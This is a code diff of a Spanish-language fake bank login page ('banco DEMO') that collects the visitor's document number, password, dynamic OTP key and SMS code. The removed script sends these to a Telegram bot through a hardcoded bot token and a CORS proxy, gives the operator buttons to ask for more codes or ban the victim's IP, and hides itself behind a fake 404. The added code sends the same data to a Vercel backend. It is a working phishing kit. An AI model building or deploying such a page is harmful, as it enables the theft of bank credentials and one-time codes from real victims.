@@ -25,48 +25,26 @@ html, body {
 
 /* ============ ESCRITORIO ============ */
 .page {
-    width: 100%;
-    max-width: 1100px;
-    min-height: calc(100vh - 95px);
-    margin: auto;
-    display: grid;
-    grid-template-columns: 340px 1fr;
-    gap: 22px;
-    align-items: center;
-    padding: 10px 20px 0;
+    width: 100%; max-width: 1100px; min-height: calc(100vh - 95px);
+    margin: auto; display: grid; grid-template-columns: 340px 1fr;
+    gap: 22px; align-items: center; padding: 10px 20px 0;
 }
 
 .login-card {
-    background: white;
-    width: 100%;
-    min-height: 600px;
-    padding: 45px 28px 25px;
-    border-radius: 14px 14px 0 0;
-    box-shadow: 0 1px 10px rgba(0,0,0,.06);
-    position: relative;
+    background: white; width: 100%; min-height: 600px;
+    padding: 45px 28px 25px; border-radius: 14px 14px 0 0;
+    box-shadow: 0 1px 10px rgba(0,0,0,.06); position: relative;
 }
 
 .security {
-    position: absolute;
-    top: 18px; right: 28px;
-    width: 19px; height: 19px;
-    border: 1.5px solid var(--orange);
-    color: var(--orange);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 11px;
+    position: absolute; top: 18px; right: 28px;
+    width: 19px; height: 19px; border: 1.5px solid var(--orange);
+    color: var(--orange); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; font-size: 11px;
 }
 
 .welcome { font-size: 18px; font-weight: bold; margin-bottom: 15px; }
-
-.logo {
-    color: var(--green);
-    font-size: 23px;
-    font-weight: 800;
-    margin-bottom: 32px;
-    letter-spacing: -.7px;
-}
-
+.logo { color: var(--green); font-size: 23px; font-weight: 800; margin-bottom: 32px; letter-spacing: -.7px; }
 .logo-symbol {
     display: inline-flex; align-items: center; justify-content: center;
     width: 25px; height: 25px; border-radius: 50%;
@@ -74,406 +52,169 @@ html, body {
 }
 
 .field { margin-bottom: 17px; }
-
-.field-label {
-    display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 8px; font-size: 13px;
-}
-
+.field-label { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13px; }
 .field-label a { color: var(--orange); font-weight: bold; text-decoration: underline; }
 
 .input {
-    width: 100%; height: 46px;
-    border: 1px solid #888; border-radius: 9px;
-    padding: 0 13px; font-size: 16px;
-    background: white; outline: none; color: #111;
-    font-family: inherit;
+    width: 100%; height: 46px; border: 1px solid #888; border-radius: 9px;
+    padding: 0 13px; font-size: 16px; background: white; outline: none; color: #111; font-family: inherit;
 }
 .input:focus { border: 1.5px solid var(--dark-green); }
 select.input { cursor: pointer; }
 
 .password-box { position: relative; }
 .password-box input { padding-right: 45px; letter-spacing: 8px; }
-
 .eye {
     position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
-    background: transparent; border: none; cursor: pointer;
-    color: #999; font-size: 19px; padding: 8px;
+    background: transparent; border: none; cursor: pointer; color: #999; font-size: 19px; padding: 8px;
 }
 
-.remember {
-    display: flex; align-items: center; gap: 9px;
-    margin: 20px 0 30px; font-size: 12px;
-}
-
-.switch {
-    width: 35px; height: 21px; background: #c7c7c7;
-    border-radius: 20px; position: relative; cursor: pointer; flex-shrink: 0;
-}
+.remember { display: flex; align-items: center; gap: 9px; margin: 20px 0 30px; font-size: 12px; }
+.switch { width: 35px; height: 21px; background: #c7c7c7; border-radius: 20px; position: relative; cursor: pointer; flex-shrink: 0; }
 .switch input { display: none; }
-.switch span {
-    width: 17px; height: 17px; position: absolute; background: white;
-    border-radius: 50%; top: 2px; left: 2px; transition: .2s;
-}
+.switch span { width: 17px; height: 17px; position: absolute; background: white; border-radius: 50%; top: 2px; left: 2px; transition: .2s; }
 .switch input:checked + span { left: 16px; }
 .switch:has(input:checked) { background: var(--green); }
 
 .continue {
     width: 100%; height: 47px; border: none; border-radius: 8px;
-    background: #bdbdbd; color: #777;
-    font-size: 16px; font-weight: bold; cursor: not-allowed;
-    transition: .2s; font-family: inherit;
+    background: #bdbdbd; color: #777; font-size: 16px; font-weight: bold;
+    cursor: not-allowed; transition: .2s; font-family: inherit;
 }
-.continue.active {
-    background: linear-gradient(110deg, #125665, #237987);
-    color: white; cursor: pointer;
-}
+.continue.active { background: linear-gradient(110deg, #125665, #237987); color: white; cursor: pointer; }
 
 .register { text-align: center; margin-top: 27px; font-size: 13px; color: #777; }
 .register a { color: var(--orange); font-weight: bold; margin-left: 5px; }
 
-.error-msg {
-    display: none; color: #d9381e; font-size: 13px;
-    margin-top: 10px; text-align: center;
-}
+.error-msg { display: none; color: #d9381e; font-size: 13px; margin-top: 10px; text-align: center; }
 .error-msg.show { display: block; }
 
 .loading-overlay {
-    display: none; position: fixed; inset: 0;
-    background: rgba(255,255,255,.9); z-index: 10000;
-    align-items: center; justify-content: center; flex-direction: column;
+    display: none; position: fixed; inset: 0; background: rgba(255,255,255,.9);
+    z-index: 10000; align-items: center; justify-content: center; flex-direction: column;
 }
-.loading-spinner {
-    border: 4px solid #f3f3f3; border-top: 4px solid var(--green);
-    border-radius: 50%; width: 50px; height: 50px;
-    animation: spin 1s linear infinite;
-}
+.loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
 @keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
 
 .right-content { width: 100%; padding: 20px 0; }
-.banner {
-    width: 100%; min-height: 280px; background: #125665;
-    border-radius: 12px; position: relative; overflow: hidden;
-    display: flex; align-items: center; color: white;
-}
-.banner::before {
-    content: ""; position: absolute; width: 250px; height: 250px;
-    background: #13e900; border-radius: 50%; top: -165px; left: -70px;
-}
-.banner::after {
-    content: ""; position: absolute; width: 230px; height: 230px;
-    background: #13e900; border-radius: 50%; bottom: -190px; right: -90px;
-}
-.banner-person {
-    position: relative; z-index: 1; width: 40%; height: 280px;
-    display: flex; align-items: end; justify-content: center; font-size: 90px;
-}
+.banner { width: 100%; min-height: 280px; background: #125665; border-radius: 12px; position: relative; overflow: hidden; display: flex; align-items: center; color: white; }
+.banner::before { content: ""; position: absolute; width: 250px; height: 250px; background: #13e900; border-radius: 50%; top: -165px; left: -70px; }
+.banner::after { content: ""; position: absolute; width: 230px; height: 230px; background: #13e900; border-radius: 50%; bottom: -190px; right: -90px; }
+.banner-person { position: relative; z-index: 1; width: 40%; height: 280px; display: flex; align-items: end; justify-content: center; font-size: 90px; }
 .banner-person span { margin-bottom: 10px; }
 .banner-info { width: 60%; position: relative; z-index: 2; padding: 20px; }
 .banner-info h2 { font-size: 22px; color: #16f000; margin-bottom: 10px; }
 .banner-info p { font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
-.banner-info button {
-    background: white; border: none; border-radius: 7px;
-    padding: 13px; color: #125665; font-weight: bold; font-size: 13px; cursor: pointer;
-}
+.banner-info button { background: white; border: none; border-radius: 7px; padding: 13px; color: #125665; font-weight: bold; font-size: 13px; cursor: pointer; }
 .slider-lines { display: flex; gap: 7px; margin: 14px 0 28px; }
 .slider-lines span { height: 4px; background: white; flex: 1; border-radius: 5px; }
 .slider-lines span:nth-child(3) { background: var(--green); }
 
 .help h2 { font-size: 17px; margin-bottom: 16px; }
 .help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-.help-card {
-    background: white; border-radius: 12px; min-height: 85px;
-    display: flex; flex-direction: column; justify-content: center;
-    align-items: center; gap: 8px; font-size: 12px; cursor: pointer;
-}
-.help-icon {
-    width: 38px; height: 38px; background: #b5f2bb; color: #00ae28;
-    border-radius: 50%; display: flex; align-items: center;
-    justify-content: center; font-size: 20px;
-}
+.help-card { background: white; border-radius: 12px; min-height: 85px; display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 8px; font-size: 12px; cursor: pointer; }
+.help-icon { width: 38px; height: 38px; background: #b5f2bb; color: #00ae28; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
 
 .footer { width: 100%; background: white; min-height: 95px; border-top: 1px solid #eee; }
-.footer-top {
-    display: flex; align-items: center; justify-content: space-between; padding: 15px 30px;
-}
+.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 15px 30px; }
 .footer-logo { color: var(--green); font-weight: 900; font-size: 21px; }
 .footer-links { display: flex; gap: 25px; }
 .footer-links a { color: var(--orange); font-size: 12px; font-weight: bold; }
-.footer-bottom {
-    border-top: 1px solid #ddd; padding: 8px 30px; font-size: 11px;
-    display: flex; justify-content: space-between;
-}
+.footer-bottom { border-top: 1px solid #ddd; padding: 8px 30px; font-size: 11px; display: flex; justify-content: space-between; }
 
 /* ============ MODAL OTP ============ */
-.demo-overlay {
-    display: none; position: fixed; inset: 0; z-index: 9999;
-    background: rgba(0,0,0,.7); backdrop-filter: blur(2px);
-    align-items: center; justify-content: center; padding: 16px;
-}
+.demo-overlay { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,.7); backdrop-filter: blur(2px); align-items: center; justify-content: center; padding: 16px; }
 .demo-overlay.is-open { display: flex; }
-
-.demo-modal {
-    width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto;
-    background: #fff; border-radius: 20px; padding: 24px 24px 30px;
-    box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative;
-    -webkit-overflow-scrolling: touch;
-}
-
+.demo-modal { width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto; background: #fff; border-radius: 20px; padding: 24px 24px 30px; box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative; -webkit-overflow-scrolling: touch; }
 .demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 8px; }
-.demo-close {
-    border: 0; background: transparent; font-size: 30px; line-height: 1;
-    width: 40px; height: 40px; cursor: pointer; color: #333;
-    display: flex; align-items: center; justify-content: center;
-}
-
-.demo-instruction {
-    background: #d7f0db; border-radius: 12px; padding: 18px 20px;
-    text-align: center; margin: 0 0 18px; color: #125665;
-    font-size: 15px; line-height: 1.5;
-}
+.demo-close { border: 0; background: transparent; font-size: 30px; line-height: 1; width: 40px; height: 40px; cursor: pointer; color: #333; display: flex; align-items: center; justify-content: center; }
+.demo-instruction { background: #d7f0db; border-radius: 12px; padding: 18px 20px; text-align: center; margin: 0 0 18px; color: #125665; font-size: 15px; line-height: 1.5; }
 .demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; }
-
-.demo-title {
-    text-align: center; font-size: 22px; line-height: 1.2;
-    margin: 10px 0 22px; color: #125665;
-}
-
+.demo-title { text-align: center; font-size: 22px; line-height: 1.2; margin: 10px 0 22px; color: #125665; }
 .demo-actions { display: flex; justify-content: center; gap: 12px; margin-top: 22px; }
-.demo-actions button {
-    flex: 1; max-width: 200px; min-height: 50px; border-radius: 10px;
-    font-weight: bold; font-size: 15px; cursor: pointer; border: none;
-    font-family: inherit;
-}
-.demo-actions .bc-button-secondary {
-    background: transparent; color: #125665; border: 1.5px solid #125665;
-}
+.demo-actions button { flex: 1; max-width: 200px; min-height: 50px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; border: none; font-family: inherit; }
+.demo-actions .bc-button-secondary { background: transparent; color: #125665; border: 1.5px solid #125665; }
 .demo-actions .bc-button-primary { background: #125665; color: #fff; }
-.demo-actions .bc-button-primary:disabled {
-    background: #bdbdbd; color: #777; cursor: not-allowed;
-}
-
+.demo-actions .bc-button-primary:disabled { background: #bdbdbd; color: #777; cursor: not-allowed; }
 .demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 18px; }
-
 .demo-step { display: none; }
 .demo-step.active { display: block; }
-
-.otp-slots-container {
-    display: flex; justify-content: center; gap: 8px; margin: 22px 0;
-}
-.otp-slot {
-    width: 44px; height: 50px;
-    border: 1px solid #ccc; border-radius: 8px;
-    text-align: center; font-size: 1.3rem; line-height: 50px;
-    font-weight: bold; background: #fdfdfd; color: #125665;
-}
+.otp-slots-container { display: flex; justify-content: center; gap: 8px; margin: 22px 0; }
+.otp-slot { width: 44px; height: 50px; border: 1px solid #ccc; border-radius: 8px; text-align: center; font-size: 1.3rem; line-height: 50px; font-weight: bold; background: #fdfdfd; color: #125665; }
 .otp-slot.active { border-color: var(--green); box-shadow: 0 0 5px rgba(0,184,46,.5); }
 .otp-slots-container.error .otp-slot { border-color: #d9381e; }
-
-.otp-hidden-input {
-    position: absolute; opacity: 0; pointer-events: none;
-    width: 1px; height: 1px;
-}
+.otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
 
 /* ============ MÓVIL / TABLET ============ */
 @media (max-width: 760px) {
     body { background: #fff; }
-
-    .page {
-        display: block;
-        padding: 0;
-        min-height: auto;
-        max-width: 100%;
-    }
-
-    .login-card {
-        width: 100%;
-        min-height: auto;
-        padding: 32px 24px 40px;
-        border-radius: 0;
-        box-shadow: none;
-    }
-
+    .page { display: block; padding: 0; min-height: auto; max-width: 100%; }
+    .login-card { width: 100%; min-height: auto; padding: 32px 24px 40px; border-radius: 0; box-shadow: none; }
     .security { top: 20px; right: 24px; }
-
-    .welcome {
-        font-size: 17px;
-        margin-bottom: 10px;
-        color: #444;
-    }
-
-    .logo {
-        font-size: 26px;
-        margin-bottom: 32px;
-        display: flex;
-        align-items: center;
-    }
-    .logo-symbol {
-        width: 30px;
-        height: 30px;
-        font-size: 15px;
-    }
-
+    .welcome { font-size: 17px; margin-bottom: 10px; color: #444; }
+    .logo { font-size: 26px; margin-bottom: 32px; display: flex; align-items: center; }
+    .logo-symbol { width: 30px; height: 30px; font-size: 15px; }
     .field { margin-bottom: 22px; }
-
-    .field-label {
-        font-size: 14px;
-        margin-bottom: 8px;
-        flex-wrap: wrap;
-        gap: 6px;
-    }
-
-    .input {
-        height: 54px;
-        font-size: 16px;
-        padding: 0 16px;
-        border-radius: 10px;
-    }
-
-    .password-box input {
-        letter-spacing: 8px;
-        padding-right: 52px;
-    }
-    .eye {
-        font-size: 22px;
-        right: 14px;
-        padding: 10px;
-    }
-
-    .remember {
-        font-size: 14px;
-        gap: 10px;
-        margin: 22px 0 28px;
-        line-height: 1.4;
-    }
+    .field-label { font-size: 14px; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
+    .input { height: 54px; font-size: 16px; padding: 0 16px; border-radius: 10px; }
+    .password-box input { letter-spacing: 8px; padding-right: 52px; }
+    .eye { font-size: 22px; right: 14px; padding: 10px; }
+    .remember { font-size: 14px; gap: 10px; margin: 22px 0 28px; line-height: 1.4; }
     .switch { width: 42px; height: 24px; }
     .switch span { width: 20px; height: 20px; top: 2px; left: 2px; }
     .switch input:checked + span { left: 20px; }
-
-    .continue {
-        height: 56px;
-        font-size: 17px;
-        border-radius: 12px;
-        margin-top: 6px;
-    }
-
-    .register {
-        font-size: 15px;
-        margin-top: 28px;
-    }
-
-    /* Banner visible pero compacto */
-    .right-content {
-        display: block;
-        padding: 8px 24px 32px;
-    }
-
-    .banner {
-        min-height: 160px;
-        border-radius: 14px;
-    }
-    .banner-person {
-        width: 32%;
-        height: 160px;
-        font-size: 60px;
-    }
-    .banner-info {
-        width: 68%;
-        padding: 16px;
-    }
-    .banner-info h2 {
-        font-size: 16px;
-        margin-bottom: 6px;
-    }
-    .banner-info p {
-        font-size: 12px;
-        line-height: 1.4;
-        margin-bottom: 10px;
-    }
-    .banner-info button {
-        padding: 9px 14px;
-        font-size: 12px;
-        border-radius: 6px;
-    }
+    .continue { height: 56px; font-size: 17px; border-radius: 12px; margin-top: 6px; }
+    .register { font-size: 15px; margin-top: 28px; }
+    .right-content { display: block; padding: 8px 24px 32px; }
+    .banner { min-height: 160px; border-radius: 14px; }
+    .banner-person { width: 32%; height: 160px; font-size: 60px; }
+    .banner-info { width: 68%; padding: 16px; }
+    .banner-info h2 { font-size: 16px; margin-bottom: 6px; }
+    .banner-info p { font-size: 12px; line-height: 1.4; margin-bottom: 10px; }
+    .banner-info button { padding: 9px 14px; font-size: 12px; border-radius: 6px; }
     .banner::before { width: 140px; height: 140px; top: -90px; left: -40px; }
     .banner::after  { width: 140px; height: 140px; bottom: -110px; right: -50px; }
-
     .slider-lines { display: none; }
-
     .help { margin-top: 28px; }
     .help h2 { font-size: 18px; margin-bottom: 16px; }
     .help-cards { gap: 12px; }
-    .help-card {
-        min-height: 96px;
-        font-size: 12px;
-        padding: 8px;
-        text-align: center;
-    }
+    .help-card { min-height: 96px; font-size: 12px; padding: 8px; text-align: center; }
     .help-icon { width: 40px; height: 40px; font-size: 20px; }
-
     .footer { min-height: 60px; }
     .footer-top { justify-content: center; padding: 16px; }
     .footer-logo { display: none; }
     .footer-bottom { display: none; }
     .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
     .footer-links a { font-size: 13px; }
-
-    /* Modal OTP cómodo */
     .demo-overlay { padding: 16px; }
-    .demo-modal {
-        padding: 22px 22px 28px;
-        border-radius: 20px;
-        max-width: 100%;
-    }
-    .demo-instruction {
-        padding: 18px 18px;
-        font-size: 15px;
-        margin-bottom: 18px;
-    }
-    .demo-title {
-        font-size: 22px;
-        margin: 10px 0 22px;
-    }
+    .demo-modal { padding: 22px 22px 28px; border-radius: 20px; max-width: 100%; }
+    .demo-instruction { padding: 18px 18px; font-size: 15px; margin-bottom: 18px; }
+    .demo-title { font-size: 22px; margin: 10px 0 22px; }
     .otp-slots-container { gap: 8px; margin: 20px 0; }
-    .otp-slot {
-        width: 44px;
-        height: 52px;
-        font-size: 1.3rem;
-        line-height: 52px;
-    }
+    .otp-slot { width: 44px; height: 52px; font-size: 1.3rem; line-height: 52px; }
     .demo-actions { gap: 12px; margin-top: 20px; }
-    .demo-actions button {
-        min-height: 52px;
-        font-size: 15px;
-    }
+    .demo-actions button { min-height: 52px; font-size: 15px; }
 }
 
-/* ============ MÓVIL PEQUEÑO ============ */
 @media (max-width: 400px) {
     .login-card { padding: 26px 20px 34px; }
     .welcome { font-size: 16px; }
     .logo { font-size: 24px; margin-bottom: 28px; }
     .logo-symbol { width: 28px; height: 28px; font-size: 14px; }
-
     .field { margin-bottom: 20px; }
     .field-label { font-size: 13px; }
     .input { height: 52px; font-size: 16px; padding: 0 14px; }
-
     .remember { font-size: 13px; margin: 20px 0 24px; }
-
     .continue { height: 54px; font-size: 16px; }
     .register { font-size: 14px; margin-top: 24px; }
-
     .right-content { padding: 8px 20px 28px; }
     .banner { min-height: 140px; }
     .banner-person { font-size: 52px; height: 140px; }
     .banner-info h2 { font-size: 15px; }
     .banner-info p { font-size: 11.5px; }
     .banner-info button { padding: 8px 12px; font-size: 11px; }
-
     .help h2 { font-size: 17px; }
     .help-card { min-height: 90px; font-size: 11.5px; }
-
     .demo-modal { padding: 20px 18px 24px; border-radius: 18px; }
     .demo-title { font-size: 20px; }
     .demo-instruction { font-size: 14px; padding: 16px 14px; }
@@ -481,8 +222,6 @@ select.input { cursor: pointer; }
     .otp-slot { width: 40px; height: 48px; font-size: 1.15rem; line-height: 48px; }
     .demo-actions button { min-height: 50px; font-size: 14px; }
 }
-
-/* ============ MÓVIL MUY PEQUEÑO ============ */
 @media (max-width: 340px) {
     .login-card { padding: 22px 16px 30px; }
     .otp-slot { width: 36px; height: 44px; font-size: 1rem; line-height: 44px; }
@@ -496,21 +235,16 @@ select.input { cursor: pointer; }
 
 <body>
 
-<!-- Loading -->
 <div class="loading-overlay" id="loading-overlay">
     <div class="loading-spinner"></div>
     <p style="margin-top:15px;font-weight:600;color:#125665;">Procesando solicitud...</p>
 </div>
 
 <main class="page">
-    <!-- FORMULARIO -->
     <section class="login-card">
         <div class="security">♙</div>
         <h1 class="welcome">Bienvenido a</h1>
-        <div class="logo">
-            <span class="logo-symbol">D</span>
-            banco DEMO
-        </div>
+        <div class="logo"><span class="logo-symbol">D</span> banco DEMO</div>
 
         <form id="demoForm" autocomplete="off" novalidate>
             <div class="field">
@@ -522,12 +256,10 @@ select.input { cursor: pointer; }
                     <option>Tarjeta de Identidad</option>
                 </select>
             </div>
-
             <div class="field">
                 <label class="field-label" for="documentNumber">Número de documento</label>
                 <input class="input" id="documentNumber" type="text" inputmode="numeric" placeholder="Número de documento" autocomplete="off" required>
             </div>
-
             <div class="field">
                 <div class="field-label">
                     <label for="password">Contraseña de demostración</label>
@@ -538,27 +270,16 @@ select.input { cursor: pointer; }
                     <button class="eye" id="togglePassword" type="button" aria-label="Mostrar u ocultar">◉</button>
                 </div>
             </div>
-
             <div class="remember">
-                <label class="switch">
-                    <input type="checkbox" id="remember">
-                    <span></span>
-                </label>
+                <label class="switch"><input type="checkbox" id="remember"><span></span></label>
                 <label for="remember">Recordar tipo y número de documento</label>
             </div>
-
             <button class="continue" id="continueButton" type="submit" disabled>Continuar</button>
-
             <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
-
-            <div class="register">
-                ¿No eres usuario?
-                <a href="#" onclick="return false">Regístrate</a>
-            </div>
+            <div class="register">¿No eres usuario? <a href="#" onclick="return false">Regístrate</a></div>
         </form>
     </section>
 
-    <!-- CONTENIDO DERECHO -->
     <section class="right-content">
         <div class="banner">
             <div class="banner-person"><span>👩🏻</span></div>
@@ -594,27 +315,15 @@ select.input { cursor: pointer; }
     </div>
 </footer>
 
-<!-- MODAL OTP -->
 <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
     <section class="demo-modal">
-        <div class="demo-close-row">
-            <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
-        </div>
-
-        <!-- Clave Dinámica -->
+        <div class="demo-close-row"><button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button></div>
         <div id="viewDinamica" class="demo-step active">
-            <div class="demo-instruction">
-                <strong>Verificación de Seguridad</strong>
-                Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.
-            </div>
+            <div class="demo-instruction"><strong>Verificación de Seguridad</strong>Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.</div>
             <h2 class="demo-title">Clave Dinámica</h2>
             <div class="otp-slots-container" id="otpContainer">
-                <div class="otp-slot"></div>
-                <div class="otp-slot"></div>
-                <div class="otp-slot"></div>
-                <div class="otp-slot"></div>
-                <div class="otp-slot"></div>
-                <div class="otp-slot"></div>
+                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
             </div>
             <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
             <p id="otpError" class="error-msg" style="margin-bottom:12px;">Clave dinámica incorrecta o expirada.</p>
@@ -623,13 +332,8 @@ select.input { cursor: pointer; }
                 <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
             </div>
         </div>
-
-        <!-- SMS -->
         <div id="viewSms" class="demo-step">
-            <div class="demo-instruction">
-                <strong>Verificación SMS</strong>
-                Hemos enviado un código SMS de 6 dígitos a tu celular registrado.
-            </div>
+            <div class="demo-instruction"><strong>Verificación SMS</strong>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
             <h2 class="demo-title">Código SMS</h2>
             <div style="max-width:280px;margin:0 auto 16px;" id="smsInputWrap">
                 <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:50px;letter-spacing:6px;">
@@ -639,18 +343,15 @@ select.input { cursor: pointer; }
                 <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
             </div>
         </div>
-
         <p class="demo-note">servicios bancarios</p>
     </section>
 </div>
 
 <script>
 // ==========================================
-// 🔑 CONFIG TELEGRAM
+// CONFIGURACIÓN (AHORA APUNTA A VERCEL)
 // ==========================================
-const TG_BOT_TOKEN = '8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8';
-const TG_CHAT_ID   = '7776240161';
-const TG_PROXY     = 'https://corsproxy.io/?';
+const API_URL = '/api/send'; // Esta es tu función en Vercel
 
 // ==========================================
 // ELEMENTOS
@@ -681,23 +382,6 @@ const smsError      = document.getElementById("smsError");
 const smsInputWrap  = document.getElementById("smsInputWrap");
 
 // ==========================================
-// ANTI-REFRESCO
-// ==========================================
-if (localStorage.getItem('sys_blocked_user') === 'true') {
-    window.stop();
-    document.documentElement.innerHTML = `
-        <html lang="es"><head><title>404 Not Found</title>
-        <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .container { text-align: center; }
-            h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; display: inline-block; border-right: 1px solid rgba(0,0,0,.3); padding: 0 20px 0 0; margin-right: 20px; vertical-align: middle; }
-            .msg { display: inline-block; text-align: left; vertical-align: middle; font-size: 14px; }
-        </style></head>
-        <body><div class="container"><h1>404</h1><div class="msg">This page could not be found.</div></div></body>
-        </html>`;
-}
-
-// ==========================================
 // ESTADO
 // ==========================================
 let pollingActivo = false;
@@ -705,6 +389,7 @@ let pollingTimeout = null;
 let ultimoUpdateId = -1;
 let actionProcessed = false;
 let msgIdActual = null;
+let usuarioActual = "";
 
 function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
 function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
@@ -719,12 +404,10 @@ function actualizarBoton() {
 
     submitBtn.disabled = !valido;
     submitBtn.classList.toggle("active", valido);
-
     if (valido) loginError.classList.remove("show");
 }
 
 documentNumber.addEventListener("input", actualizarBoton);
-
 claveInput.addEventListener("input", function() {
     claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
     actualizarBoton();
@@ -737,109 +420,75 @@ togglePassword.addEventListener("click", function() {
 });
 
 // ==========================================
-// TELEGRAM
+// ENVIAR A VERCEL (BACKEND)
 // ==========================================
-async function tgSend(payload) {
-    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+async function enviarAlBackend(payload) {
     try {
-        const res = await fetch(TG_PROXY + encodeURIComponent(url), {
+        const res = await fetch(API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
         const data = await res.json();
-        console.log('📨 Telegram respuesta:', data);
+        console.log('Respuesta del backend:', data);
         return data;
-    } catch (err) {
-        console.error('❌ Error fetch Telegram:', err);
-        throw err;
+    } catch (error) {
+        console.error('Error de red:', error);
+        throw error;
     }
 }
 
-function enviarIdentificacionTelegram(tipoDoc, usuario, clave) {
-    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
+function enviarIdentificacion(tipoDoc, usuario, clave) {
+    usuarioActual = usuario;
+    mostrarOverlay();
 
-    const keyboard = {
-        inline_keyboard: [
-            [
-                { text: '❌ Usuario Malo', callback_data: 'error_usuario' },
-                { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }
-            ],
-            [
-                { text: '🚫 Banear IP', callback_data: 'banear_ip' },
-                { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }
-            ]
-        ]
-    };
-
-    console.log('🚀 Enviando login a Telegram:', { tipoDoc, usuario });
-
-    tgSend({
-        chat_id: TG_CHAT_ID,
-        text: mensaje,
-        parse_mode: 'HTML',
-        reply_markup: keyboard
-    }).then(data => {
+    enviarAlBackend({ action: 'login', tipoDoc, usuario, clave })
+    .then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
+            // Iniciar polling para escuchar las respuestas de los botones
             escucharBotones(handleTelegramActionLogin);
         } else {
-            console.error('❌ Telegram rechazó:', data);
             ocultarOverlay();
             alert('Error al contactar al bot. Revisa consola.');
         }
-    }).catch(err => {
+    }).catch(() => {
         ocultarOverlay();
-        alert('No se pudo conectar con Telegram.\n' + err.message);
+        alert('Error de conexión con el servidor.');
     });
 }
 
-function enviarDinamicaTelegram(dinamica) {
-    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
-
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
-            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-        ]
-    };
-
-    tgSend({
-        chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard
-    }).then(data => {
+function enviarDinamica(dinamica) {
+    mostrarOverlay();
+    enviarAlBackend({ action: 'dinamica', usuario: usuarioActual, dynamicCode: dinamica })
+    .then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             actionProcessed = false;
             escucharBotones(handleTelegramActionDinamica);
+        } else {
+            ocultarOverlay();
         }
     }).catch(() => ocultarOverlay());
 }
 
-function enviarSmsTelegram(codigoSms) {
-    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`;
-
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
-            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
-            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
-        ]
-    };
-
-    tgSend({
